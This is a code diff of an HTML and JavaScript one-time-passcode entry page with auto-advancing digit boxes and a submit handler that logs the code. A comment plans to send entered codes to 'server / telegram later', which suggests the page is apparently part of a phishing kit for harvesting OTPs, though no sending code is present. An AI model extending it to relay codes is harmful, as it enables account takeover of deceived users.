@@ -1,35 +1,63 @@
 <!DOCTYPE html>
 <html>
+
 <head>
-    <title>Enter OTP</title>
+    <title>OTP Verification</title>
+    <link rel="stylesheet" href="style.css">
 </head>
+
 <body>
 
-<h2>Enter OTP</h2>
+<div class="header"></div>
 
-<div id="otpBoxes" style="display:flex; gap:10px;"></div>
+<div class="container">
 
-<button onclick="submitOTP()">Submit</button>
+    <h2 class="title">Verification</h2>
+
+    <!-- 🔄 LOADER -->
+    <div class="loader"></div>
+
+    <p style="text-align:center; margin-top:15px;">
+        OTP has been sent to your phone number.<br>
+        Please enter it below to continue.
+    </p>
+
+    <!-- 🔢 OTP BOXES -->
+    <div id="otpBoxes" style="display:flex; justify-content:center; gap:10px; margin-top:20px;"></div>
+
+    <!-- BUTTON -->
+    <button class="login-btn" onclick="submitOTP()">Verify OTP</button>
+
+</div>
+
+<div class="footer"></div>
 
 <script>
-const length = parseInt(localStorage.getItem("otpLength")) || 5;
+// get OTP length (5 or 6)
+const length = localStorage.getItem("otpLength") || 5;
+
 const container = document.getElementById("otpBoxes");
 
-// CREATE BOXES
+// create boxes dynamically
 for (let i = 0; i < length; i++) {
     const input = document.createElement("input");
+    input.type = "text";
     input.maxLength = 1;
-    input.className = "otp-box";
-    input.style.width = "40px";
-    input.style.height = "40px";
+    input.className = "pin-box";
+
+    input.style.width = "45px";
+    input.style.height = "45px";
     input.style.textAlign = "center";
     input.style.fontSize = "18px";
+    input.style.border = "1px solid #ccc";
+    input.style.borderRadius = "5px";
 
     container.appendChild(input);
 }
 
-// AUTO MOVE
-const inputs = document.querySelectorAll(".otp-box");
+// auto move between inputs
+const inputs = document.querySelectorAll(".pin-box");
+
 inputs.forEach((input, index) => {
     input.addEventListener("input", () => {
         if (input.value.length === 1 && index < inputs.length - 1) {
@@ -38,17 +66,26 @@ inputs.forEach((input, index) => {
     });
 });
 
-// SUBMIT
+// submit OTP
 function submitOTP() {
     let otp = "";
-    inputs.forEach(input => otp += input.value);
 
-    if (otp.length !== length) {
-        alert("Enter complete OTP");
+    inputs.forEach(input => {
+        otp += input.value;
+    });
+
+    if (otp.length != length) {
+        alert("Enter full OTP");
         return;
     }
 
-    alert("OTP: " + otp);
+    // OPTIONAL: send OTP to server / telegram later
+    console.log("OTP ENTERED:", otp);
+
+    alert("OTP submitted successfully");
+
+    // you can redirect if needed
+    // window.location.href = "success.html";
 }
 </script>
 
